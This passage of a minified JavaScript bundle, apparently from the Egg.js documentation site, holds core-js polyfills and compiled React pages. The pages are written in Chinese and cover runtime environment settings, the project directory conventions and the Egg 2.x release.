0},S=function(e,t){var n,a=y(this,{cleanup:void 0,observer:i(e),subscriptionObserver:void 0});r||(this.closed=!1);try{(n=k(e.start))&&n.call(e,this)}catch(u){g(u)}if(!x(a)){var l=a.subscriptionObserver=new C(this);try{var c=t(l),s=c;null!=c&&(a.cleanup="function"===typeof c.unsubscribe?function(){s.unsubscribe()}:o(c))}catch(u){return void l.error(u)}x(a)&&w(a)}};S.prototype=m({},{unsubscribe:function(){var e=v(this);x(e)||(j(this,e),w(e))}}),r&&u(S.prototype,"closed",{configurable:!0,get:function(){return x(v(this))}});var C=function(e){y(this,{subscription:e}),r||(this.closed=!1)};C.prototype=m({},{next:function(e){var t=v(v(this).subscription);if(!x(t)){var n=t.observer;try{var a=k(n.next);a&&a.call(n,e)}catch(r){g(r)}}},error:function(e){var t=v(this).subscription,n=v(t);if(!x(n)){var a=n.observer;j(t,n);try{var r=k(a.error);r?r.call(a,e):g(e)}catch(l){g(l)}w(n)}},complete:function(){var e=v(this).subscription,t=v(e);if(!x(t)){var n=t.observer;j(e,t);try{var a=k(n.complete);a&&a.call(n)}catch(r){g(r)}w(t)}}}),r&&u(C.prototype,"closed",{configurable:!0,get:function(){return x(v(v(this).subscription))}});var A=function(e){s(this,A,"Observable"),y(this,{subscriber:o(e)})};m(A.prototype,{subscribe:function(e){var t=arguments.length;return new S("function"===typeof e?{next:e,error:t>1?arguments[1]:void 0,complete:t>2?arguments[2]:void 0}:c(e)?e:{},v(this).subscriber)}}),m(A,{from:function(e){var t="function"===typeof this?this:A,n=k(i(e)[b]);if(n){var a=i(n.call(e));return a.constructor===t?a:new t((function(e){return a.subscribe(e)}))}var r=p(e);return new t((function(e){h(r,(function(t){if(e.next(t),e.closed)return h.stop()}),void 0,!1,!0),e.complete()}))},of:function(){var e="function"===typeof this?this:A,t=arguments.length,n=new Array(t),a=0;while(a<t)n[a]=arguments[a++];return new e((function(e){for(var a=0;a<t;a++)if(e.next(n[a]),e.closed)return;e.complete()}))}}),d(A.prototype,b,(function(){return this})),a({global:!0},{Observable:A}),l("Observable")},LY5W:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u4e00\u4e2a Web \u5e94\u7528\u672c\u8eab\u5e94\u8be5\u662f\u65e0\u72b6\u6001\u7684\uff0c\u5e76\u62e5\u6709\u6839\u636e\u8fd0\u884c\u73af\u5883\u8bbe\u7f6e\u81ea\u8eab\u7684\u80fd\u529b\u3002"),r.a.createElement("h2",{id:"\u6307\u5b9a\u8fd0\u884c\u73af\u5883"},r.a.createElement(l["AnchorLink"],{to:"#\u6307\u5b9a\u8fd0\u884c\u73af\u5883","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6307\u5b9a\u8fd0\u884c\u73af\u5883"),r.a.createElement("p",null,"\u6846\u67b6\u6709\u4e24\u79cd\u65b9\u5f0f\u6307\u5b9a\u8fd0\u884c\u73af\u5883\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u901a\u8fc7 \xa0",r.a.createElement("code",null,"config/env")," \u6587\u4ef6\u6307\u5b9a\uff0c\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u662f\u8fd0\u884c\u73af\u5883\uff0c\u5982 ",r.a.createElement("code",null,"prod"),"\u3002\u4e00\u822c\u901a\u8fc7\u6784\u5efa\u5de5\u5177\u6765\u751f\u6210\u8fd9\u4e2a\u6587\u4ef6\u3002")),r.a.createElement(o["a"],{code:"// config/env\nprod",lang:"unknown"}),r.a.createElement("ol",{start:2},r.a.createElement("li",null,"\u901a\u8fc7 ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u8fd0\u884c\u73af\u5883\u66f4\u52a0\u65b9\u4fbf\uff0c\u6bd4\u5982\u5728\u751f\u4ea7\u73af\u5883\u542f\u52a8\u5e94\u7528\uff1a")),r.a.createElement(o["a"],{code:"EGG_SERVER_ENV=prod npm start",lang:"shell"}),r.a.createElement("h2",{id:"\u5e94\u7528\u5185\u83b7\u53d6\u8fd0\u884c\u73af\u5883"},r.a.createElement(l["AnchorLink"],{to:"#\u5e94\u7528\u5185\u83b7\u53d6\u8fd0\u884c\u73af\u5883","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e94\u7528\u5185\u83b7\u53d6\u8fd0\u884c\u73af\u5883"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u53d8\u91cf ",r.a.createElement("code",null,"app.config.env")," \u6765\u8868\u793a\u5e94\u7528\u5f53\u524d\u7684\u8fd0\u884c\u73af\u5883\u3002"),r.a.createElement("h2",{id:"\u8fd0\u884c\u73af\u5883\u76f8\u5173\u914d\u7f6e"},r.a.createElement(l["AnchorLink"],{to:"#\u8fd0\u884c\u73af\u5883\u76f8\u5173\u914d\u7f6e","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fd0\u884c\u73af\u5883\u76f8\u5173\u914d\u7f6e"),r.a.createElement("p",null,"\u4e0d\u540c\u7684\u8fd0\u884c\u73af\u5883\u4f1a\u5bf9\u5e94\u4e0d\u540c\u7684\u914d\u7f6e\uff0c\u5177\u4f53\u8bf7\u9605\u8bfb ",r.a.createElement(l["Link"],{to:"./config"},"Config \u914d\u7f6e"),"\u3002"),r.a.createElement("h2",{id:"\u4e0e-node_env-\u7684\u533a\u522b"},r.a.createElement(l["AnchorLink"],{to:"#\u4e0e-node_env-\u7684\u533a\u522b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e0e NODE_ENV \u7684\u533a\u522b"),r.a.createElement("p",null,"\u5f88\u591a Node.js \u5e94\u7528\u4f1a\u4f7f\u7528 ",r.a.createElement("code",null,"NODE_ENV")," \u6765\u533a\u5206\u8fd0\u884c\u73af\u5883\uff0c\u4f46 ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u533a\u5206\u5f97\u66f4\u52a0\u7cbe\u7ec6\u3002\u4e00\u822c\u7684\u9879\u76ee\u5f00\u53d1\u6d41\u7a0b\u5305\u62ec\u672c\u5730\u5f00\u53d1\u73af\u5883\u3001\u6d4b\u8bd5\u73af\u5883\u3001\u751f\u4ea7\u73af\u5883\u7b49\uff0c\u9664\u4e86\u672c\u5730\u5f00\u53d1\u73af\u5883\u548c\u6d4b\u8bd5\u73af\u5883\u5916\uff0c\u5176\u4ed6\u73af\u5883\u53ef\u7edf\u79f0\u4e3a",r.a.createElement("strong",null,"\u670d\u52a1\u5668\u73af\u5883"),"\uff0c\u670d\u52a1\u5668\u73af\u5883\u7684 ",r.a.createElement("code",null,"NODE_ENV")," \u5e94\u8be5\u4e3a ",r.a.createElement("code",null,"production"),"\u3002\u800c\u4e14 npm \u4e5f\u4f1a\u4f7f\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u5728\u5e94\u7528\u90e8\u7f72\u7684\u65f6\u5019\u4e00\u822c\u4e0d\u4f1a\u5b89\u88c5 devDependencies\uff0c\u6240\u4ee5\u8fd9\u4e2a\u503c\u4e5f\u5e94\u8be5\u4e3a ",r.a.createElement("code",null,"production"),"\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u9ed8\u8ba4\u652f\u6301\u7684\u8fd0\u884c\u73af\u5883\u53ca\u6620\u5c04\u5173\u7cfb\uff08\u5982\u679c\u672a\u6307\u5b9a ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u4f1a\u6839\u636e ",r.a.createElement("code",null,"NODE_ENV")," \u6765\u5339\u914d\uff09"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"NODE_ENV"),r.a.createElement("th",null,"EGG_SERVER_ENV"),r.a.createElement("th",null,"\u8bf4\u660e"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null),r.a.createElement("td",null,"local"),r.a.createElement("td",null,"\u672c\u5730\u5f00\u53d1\u73af\u5883")),r.a.createElement("tr",null,r.a.createElement("td",null,"test"),r.a.createElement("td",null,"unittest"),r.a.createElement("td",null,"\u5355\u5143\u6d4b\u8bd5")),r.a.createElement("tr",null,r.a.createElement("td",null,"production"),r.a.createElement("td",null,"prod"),r.a.createElement("td",null,"\u751f\u4ea7\u73af\u5883")))),r.a.createElement("p",null,"\u4f8b\u5982\uff0c\u5f53 ",r.a.createElement("code",null,"NODE_ENV")," \u4e3a ",r.a.createElement("code",null,"production")," \u800c ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u672a\u6307\u5b9a\u65f6\uff0c\u6846\u67b6\u4f1a\u5c06 ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u8bbe\u7f6e\u6210 ",r.a.createElement("code",null,"prod"),"\u3002"),r.a.createElement("h2",{id:"\u81ea\u5b9a\u4e49\u73af\u5883"},r.a.createElement(l["AnchorLink"],{to:"#\u81ea\u5b9a\u4e49\u73af\u5883","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u81ea\u5b9a\u4e49\u73af\u5883"),r.a.createElement("p",null,"\u5e38\u89c4\u5f00\u53d1\u6d41\u7a0b\u53ef\u80fd\u4e0d\u4ec5\u4ec5\u53ea\u6709\u4ee5\u4e0a\u51e0\u79cd\u73af\u5883\uff0cEgg \u652f\u6301\u81ea\u5b9a\u4e49\u73af\u5883\u6765\u9002\u5e94\u81ea\u5df1\u7684\u5f00\u53d1\u6d41\u7a0b\u3002"),r.a.createElement("p",null,"\u6bd4\u5982\uff0c\u8981\u4e3a\u5f00\u53d1\u6d41\u7a0b\u589e\u52a0\u96c6\u6210\u6d4b\u8bd5\u73af\u5883 SIT\u3002\u5c06 ",r.a.createElement("code",null,"EGG_SERVER_ENV")," \u8bbe\u7f6e\u6210 ",r.a.createElement("code",null,"sit"),"\uff08\u5e76\u5efa\u8bae\u8bbe\u7f6e ",r.a.createElement("code",null,"NODE_ENV = production"),"\uff09\uff0c\u542f\u52a8\u65f6\u4f1a\u52a0\u8f7d ",r.a.createElement("code",null,"config/config.sit.js"),"\uff0c\u8fd0\u884c\u73af\u5883\u53d8\u91cf ",r.a.createElement("code",null,"app.config.env")," \u4f1a\u88ab\u8bbe\u7f6e\u6210 ",r.a.createElement("code",null,"sit"),"\u3002"),r.a.createElement("h2",{id:"\u4e0e-koa-\u7684\u533a\u522b"},r.a.createElement(l["AnchorLink"],{to:"#\u4e0e-koa-\u7684\u533a\u522b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e0e Koa \u7684\u533a\u522b"),r.a.createElement("p",null,"\u5728 Koa \u4e2d\u6211\u4eec\u901a\u8fc7 ",r.a.createElement("code",null,"app.env")," \u6765\u8fdb\u884c\u73af\u5883\u5224\u65ad\uff0c",r.a.createElement("code",null,"app.env")," \u9ed8\u8ba4\u7684\u503c\u662f ",r.a.createElement("code",null,"process.env.NODE_ENV"),"\u3002\u4f46\u662f\u5728 Egg\uff08\u548c\u57fa\u4e8e Egg \u7684\u6846\u67b6\uff09\u4e2d\uff0c\u914d\u7f6e\u7edf\u4e00\u90fd\u653e\u7f6e\u5728 ",r.a.createElement("code",null,"app.config")," \u4e0a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u901a\u8fc7 ",r.a.createElement("code",null,"app.config.env")," \u6765\u533a\u5206\u73af\u5883\uff0c",r.a.createElement("code",null,"app.env")," \u4e0d\u518d\u4f7f\u7528\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},LZgk:function(e,t,n){"use strict";function a(e,t){if(!e)return!1;if(e.contains)return e.contains(t);var n=t;while(n){if(n===e)return!0;n=n.parentNode}return!1}n.d(t,"a",(function(){return a}))},Lcxk:function(e,t,n){"use strict";function a(e,t){l(e)&&(e="100%");var n=o(e);return e=360===t?e:Math.min(t,Math.max(0,parseFloat(e))),n&&(e=parseInt(String(e*t),10)/100),Math.abs(e-t)<1e-6?1:(e=360===t?(e<0?e%t+t:e%t)/parseFloat(String(t)):e%t/parseFloat(String(t)),e)}function r(e){return Math.min(1,Math.max(0,e))}function l(e){return"string"===typeof e&&-1!==e.indexOf(".")&&1===parseFloat(e)}function o(e){return"string"===typeof e&&-1!==e.indexOf("%")}function i(e){return e=parseFloat(e),(isNaN(e)||e<0||e>1)&&(e=1),e}function c(e){return e<=1?"".concat(100*Number(e),"%"):e}function s(e){return 1===e.length?"0"+e:String(e)}n.d(t,"a",(function(){return a})),n.d(t,"c",(function(){return r})),n.d(t,"b",(function(){return i})),n.d(t,"d",(function(){return c})),n.d(t,"e",(function(){return s}))},Le6N:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5728",r.a.createElement(l["Link"],{to:"../intro/quickstart"},"\u5feb\u901f\u5165\u95e8"),"\u4e2d\uff0c\u5927\u5bb6\u5bf9\u6846\u67b6\u5e94\u8be5\u6709\u4e86\u521d\u6b65\u7684\u5370\u8c61\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u7b80\u5355\u4e86\u89e3\u4e0b\u76ee\u5f55\u7ea6\u5b9a\u89c4\u8303\u3002"),r.a.createElement(o["a"],{code:"egg-project\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js (\u53ef\u9009)\n\u251c\u2500\u2500 agent.js (\u53ef\u9009)\n\u251c\u2500\u2500 app\n|   \u251c\u2500\u2500 router.js\n\u2502   \u251c\u2500\u2500 controller\n\u2502   |   \u2514\u2500\u2500 home.js\n\u2502   \u251c\u2500\u2500 service (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 user.js\n\u2502   \u251c\u2500\u2500 middleware (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 response_time.js\n\u2502   \u251c\u2500\u2500 schedule (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 my_task.js\n\u2502   \u251c\u2500\u2500 public (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 reset.css\n\u2502   \u251c\u2500\u2500 view (\u53ef\u9009)\n\u2502   |   \u2514\u2500\u2500 home.tpl\n\u2502   \u2514\u2500\u2500 extend (\u53ef\u9009)\n\u2502       \u251c\u2500\u2500 helper.js (\u53ef\u9009)\n\u2502       \u251c\u2500\u2500 request.js (\u53ef\u9009)\n\u2502       \u251c\u2500\u2500 response.js (\u53ef\u9009)\n\u2502       \u251c\u2500\u2500 context.js (\u53ef\u9009)\n\u2502       \u251c\u2500\u2500 application.js (\u53ef\u9009)\n\u2502       \u2514\u2500\u2500 agent.js (\u53ef\u9009)\n\u251c\u2500\u2500 config\n|   \u251c\u2500\u2500 plugin.js\n|   \u251c\u2500\u2500 config.default.js\n\u2502   \u251c\u2500\u2500 config.prod.js\n|   \u251c\u2500\u2500 config.test.js (\u53ef\u9009)\n|   \u251c\u2500\u2500 config.local.js (\u53ef\u9009)\n|   \u2514\u2500\u2500 config.unittest.js (\u53ef\u9009)\n\u2514\u2500\u2500 test\n    \u251c\u2500\u2500 middleware\n    |   \u2514\u2500\u2500 response_time.test.js\n    \u2514\u2500\u2500 controller\n        \u2514\u2500\u2500 home.test.js",lang:"bash"}),r.a.createElement("p",null,"\u5982\u4e0a\uff0c\u7531\u6846\u67b6\u7ea6\u5b9a\u7684\u76ee\u5f55\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/router.js")," \u7528\u4e8e\u914d\u7f6e URL \u8def\u7531\u89c4\u5219\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"./router"},"Router"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/controller/**")," \u7528\u4e8e\u89e3\u6790\u7528\u6237\u7684\u8f93\u5165\uff0c\u5904\u7406\u540e\u8fd4\u56de\u76f8\u5e94\u7684\u7ed3\u679c\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"./controller"},"Controller"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/service/**")," \u7528\u4e8e\u7f16\u5199\u4e1a\u52a1\u903b\u8f91\u5c42\uff0c\u53ef\u9009\uff0c\u5efa\u8bae\u4f7f\u7528\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"./service"},"Service"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/middleware/**")," \u7528\u4e8e\u7f16\u5199\u4e2d\u95f4\u4ef6\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"./middleware"},"Middleware"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/public/**")," \u7528\u4e8e\u653e\u7f6e\u9759\u6001\u8d44\u6e90\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1\u5185\u7f6e\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"egg-static"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/extend/**")," \u7528\u4e8e\u6846\u67b6\u7684\u6269\u5c55\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./extend"},"\u6846\u67b6\u6269\u5c55"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"config/config.","{","env","}",".js")," \u7528\u4e8e\u7f16\u5199\u914d\u7f6e\u6587\u4ef6\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./config"},"\u914d\u7f6e"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"config/plugin.js")," \u7528\u4e8e\u914d\u7f6e\u9700\u8981\u52a0\u8f7d\u7684\u63d2\u4ef6\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./plugin"},"\u63d2\u4ef6"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"test/**")," \u7528\u4e8e\u5355\u5143\u6d4b\u8bd5\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../core/unittest"},"\u5355\u5143\u6d4b\u8bd5"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app.js")," \u548c ",r.a.createElement("code",null,"agent.js")," \u7528\u4e8e\u81ea\u5b9a\u4e49\u542f\u52a8\u65f6\u7684\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49"),"\u3002\u5173\u4e8e",r.a.createElement("code",null,"agent.js"),"\u7684\u4f5c\u7528\u53c2\u89c1",r.a.createElement(l["AnchorLink"],{to:"../core/cluster-and-ipc#agent-%E6%9C%BA%E5%88%B6"},"Agent \u673a\u5236"),"\u3002")),r.a.createElement("p",null,"\u7531\u5185\u7f6e\u63d2\u4ef6\u7ea6\u5b9a\u7684\u76ee\u5f55\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/public/**")," \u7528\u4e8e\u653e\u7f6e\u9759\u6001\u8d44\u6e90\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1\u5185\u7f6e\u63d2\u4ef6 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"egg-static"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/schedule/**")," \u7528\u4e8e\u5b9a\u65f6\u4efb\u52a1\uff0c\u53ef\u9009\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"./schedule"},"\u5b9a\u65f6\u4efb\u52a1"),"\u3002")),r.a.createElement("p",null,r.a.createElement("strong",null,"\u82e5\u9700\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684\u76ee\u5f55\u89c4\u8303\uff0c\u53c2\u89c1 ",r.a.createElement(l["Link"],{to:"https://eggjs.org/zh-cn/advanced/loader.html"},"Loader API"))),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/view/**")," \u7528\u4e8e\u653e\u7f6e\u6a21\u677f\u6587\u4ef6\uff0c\u53ef\u9009\uff0c\u7531\u6a21\u677f\u63d2\u4ef6\u7ea6\u5b9a\uff0c\u5177\u4f53\u53c2\u89c1",r.a.createElement(l["Link"],{to:"../core/view"},"\u6a21\u677f\u6e32\u67d3"),"\u3002"),r.a.createElement("li",null,r.a.createElement("code",null,"app/model/**")," \u7528\u4e8e\u653e\u7f6e\u9886\u57df\u6a21\u578b\uff0c\u53ef\u9009\uff0c\u7531\u9886\u57df\u7c7b\u76f8\u5173\u63d2\u4ef6\u7ea6\u5b9a\uff0c\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-sequelize"},"egg-sequelize"),"\u3002"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},LrkD:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=n("Yftc"),i=r.has,c=r.get,s=r.toKey,u=function(e,t,n){var a=i(e,t,n);if(a)return c(e,t,n);var r=o(t);return null!==r?u(e,r,n):void 0};a({target:"Reflect",stat:!0},{getMetadata:function(e,t){var n=arguments.length<3?void 0:s(arguments[2]);return u(e,l(t),n)}})},LyaT:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("XaNN"),i=n("BZjo"),c=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{reduce:function(e){var t=l(this),n=i(t),a=arguments.length<2,r=a?void 0:arguments[1];if(o(e),c(n,(function(n){a?(a=!1,r=n):r=e(r,n,n,t)}),void 0,!1,!0),a)throw TypeError("Reduce of empty set with no initial value");return r}})},"M+A8":function(e,t){e.exports=["constructor","hasOwnProperty","isPrototypeOf","propertyIsEnumerable","toLocaleString","toString","valueOf"]},MAgz:function(e,t,n){"use strict";var a,r=n("rV3k"),l=n("9Rcy"),o=n("A0UU"),i=n("a7jj"),c=n("31yA"),s=n("+0HW"),u=n("XExY"),d=n("AzF/"),m=n("u3TI").f,p=n("Yftc"),h=n("4bQT"),g=n("q7Pv"),f=n("vbCh"),E=o.Int8Array,b=E&&E.prototype,v=o.Uint8ClampedArray,y=v&&v.prototype,k=E&&p(E),w=b&&p(b),x=Object.prototype,j=x.isPrototypeOf,S=g("toStringTag"),C=f("TYPED_ARRAY_TAG"),A=r&&!!h&&"Opera"!==s(o.opera),L=!1,T={Int8Array:1,Uint8Array:1,Uint8ClampedArray:1,Int16Array:2,Uint16Array:2,Int32Array:4,Uint32Array:4,Float32Array:4,Float64Array:8},N=function(e){var t=s(e);return"DataView"===t||c(T,t)},O=function(e){return i(e)&&c(T,s(e))},I=function(e){if(O(e))return e;throw TypeError("Target is not a typed array")},P=function(e){if(h){if(j.call(k,e))return e}else for(var t in T)if(c(T,a)){var n=o[t];if(n&&(e===n||j.call(n,e)))return e}throw TypeError("Target is not a typed array constructor")},R=function(e,t,n){if(l){if(n)for(var a in T){var r=o[a];r&&c(r.prototype,e)&&delete r.prototype[e]}w[e]&&!n||d(w,e,n?t:A&&b[e]||t)}},_=function(e,t,n){var a,r;if(l){if(h){if(n)for(a in T)r=o[a],r&&c(r,e)&&delete r[e];if(k[e]&&!n)return;try{return d(k,e,n?t:A&&E[e]||t)}catch(i){}}for(a in T)r=o[a],!r||r[e]&&!n||d(r,e,t)}};for(a in T)o[a]||(A=!1);if((!A||"function"!=typeof k||k===Function.prototype)&&(k=function(){throw TypeError("Incorrect invocation")},A))for(a in T)o[a]&&h(o[a],k);if((!A||!w||w===x)&&(w=k.prototype,A))for(a in T)o[a]&&h(o[a].prototype,w);if(A&&p(y)!==w&&h(y,w),l&&!c(w,S))for(a in L=!0,m(w,S,{get:function(){return i(this)?this[C]:void 0}}),T)o[a]&&u(o[a],C,a);e.exports={NATIVE_ARRAY_BUFFER_VIEWS:A,TYPED_ARRAY_TAG:L&&C,aTypedArray:I,aTypedArrayConstructor:P,exportTypedArrayMethod:R,exportTypedArrayStaticMethod:_,isView:N,isTypedArray:O,TypedArray:k,TypedArrayPrototype:w}},MCGb:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("AOzO"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{findKey:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return c(n,(function(e,n){if(a(n,e,t))return c.stop(e)}),void 0,!0,!0).result}})},MPZC:function(e,t,n){var a=n("A0UU"),r=n("Xdqv"),l=n("o9Ln"),o=n("MAgz").NATIVE_ARRAY_BUFFER_VIEWS,i=a.ArrayBuffer,c=a.Int8Array;e.exports=!o||!r((function(){c(1)}))||!r((function(){new c(-1)}))||!l((function(e){new c,new c(null),new c(1.5),new c(e)}),!0)||r((function(){return 1!==new c(new i(2),1,void 0).length}))},MW8C:function(e,t,n){"use strict";var a=n("0mt+"),r=n("x5+g").map,l=n("mIyh"),o=n("hOjR"),i=l("map"),c=o("map");a({target:"Array",proto:!0,forced:!i||!c},{map:function(e){return r(this,e,arguments.length>1?arguments[1]:void 0)}})},MlNl:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u80cc\u666f"},r.a.createElement(l["AnchorLink"],{to:"#\u80cc\u666f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u80cc\u666f"),r.a.createElement("p",null,"\u968f\u7740 Node.js 8 LTS \u7684\u53d1\u5e03\uff0c \u5185\u5efa\u4e86\u5bf9 ES2017 Async Function \u7684\u652f\u6301\u3002"),r.a.createElement("p",null,"\u5728\u8fd9\u4e4b\u524d\uff0cTJ \u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u4f7f\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u4eab\u53d7\u5230 ",r.a.createElement("code",null,"async/await")," \u7684\u7f16\u7a0b\u4f53\u9a8c\uff0c\u4f46\u540c\u65f6\u5b83\u4e0d\u53ef\u907f\u514d\u7684\u4e5f\u5e26\u6765\u4e00\u4e9b\u95ee\u9898\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6027\u80fd\u635f\u5931"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/wiki/co-vs-async"},"\u9519\u8bef\u5806\u6808\u4e0d\u53cb\u597d"))),r.a.createElement("p",null,"\u73b0\u5728 Egg \u6b63\u5f0f\u53d1\u5e03\u4e86 2.x \u7248\u672c\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4fdd\u6301\u4e86\u5bf9 Egg 1.x \u4ee5\u53ca ",r.a.createElement("code",null,"generator function")," \u7684",r.a.createElement("strong",null,"\u5b8c\u5168\u517c\u5bb9"),"\u3002"),r.a.createElement("li",null,"\u57fa\u4e8e Koa 2.x\uff0c\u5f02\u6b65\u89e3\u51b3\u65b9\u6848\u57fa\u4e8e ",r.a.createElement("code",null,"async function"),"\u3002"),r.a.createElement("li",null,"\u53ea\u652f\u6301 Node.js 8 \u53ca\u4ee5\u4e0a\u7248\u672c\u3002"),r.a.createElement("li",null,"\u53bb\u9664 ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u540e\u5806\u6808\u4fe1\u606f\u66f4\u6e05\u6670\uff0c\u5e26\u6765 30% \u5de6\u53f3\u7684\u6027\u80fd\u63d0\u5347\uff08\u4e0d\u542b Node \u5e26\u6765\u7684\u6027\u80fd\u63d0\u5347\uff09\uff0c\u8be6\u7ec6\u53c2\u89c1\uff1a",r.a.createElement(l["Link"],{to:"https://eggjs.github.io/benchmark/plot/"},"benchmark"),"\u3002")),r.a.createElement("p",null,"Egg 